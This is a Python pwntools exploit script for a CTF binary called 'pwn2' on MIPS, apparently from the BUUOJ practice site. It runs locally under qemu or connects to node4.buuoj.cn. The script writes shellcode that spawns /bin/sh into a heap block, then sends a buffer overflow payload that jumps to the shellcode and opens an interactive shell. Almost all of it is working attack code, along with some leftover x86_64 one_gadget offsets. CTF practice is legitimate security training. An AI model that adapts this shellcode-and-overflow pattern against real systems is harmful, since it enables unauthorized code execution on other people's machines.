#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./pwn2'
context.arch='mips'
while True :
	# try :
		elf=ELF(elfelf)
		context.arch=elf.arch

		if len(sys.argv)==1 :
			# io=process(elfelf)
			io=process(['qemu-mipsel','-L','/home/keer/mipsel','-g','1234','./pwn2'])
			# libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		else :
			io=remote('node4.buuoj.cn',25816)
			# libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Give me a block ID: ',str(a))
			io.sendlineafter('how big: ',str(b))

		def edit(a,b):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Which block to write?',str(a))
			io.sendlineafter('Content: ',b)

		def hack(a):
			io.sendlineafter('Your choice: ','7')
			io.sendlineafter('Write down your feeling:\n',a)

		def delete(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Which one to throw?',str(a))

		io.recv()
		io.send('keer')

		add(0,0x80)
		add(1,0x80)
		add(2,0x80)

		edit(0,asm(shellcraft.sh()))
		pay='a'*0x3c+p32(0x412008)
		hack(pay)
		

		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue